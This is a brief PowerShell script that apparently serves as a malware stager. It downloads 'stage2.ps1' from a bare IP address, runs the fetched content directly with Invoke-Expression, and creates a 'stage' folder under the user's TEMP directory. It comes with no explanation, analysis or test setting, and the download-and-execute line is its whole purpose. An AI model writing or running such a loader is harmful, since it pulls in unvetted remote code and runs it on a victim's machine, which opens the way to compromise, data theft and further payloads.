
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://203.0.113.226/stage2.ps1',
    [int]$TimeoutSec = 96
)
IEX (Invoke-WebRequest -Uri $DownloadUrl -UseBasicParsing).Content
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
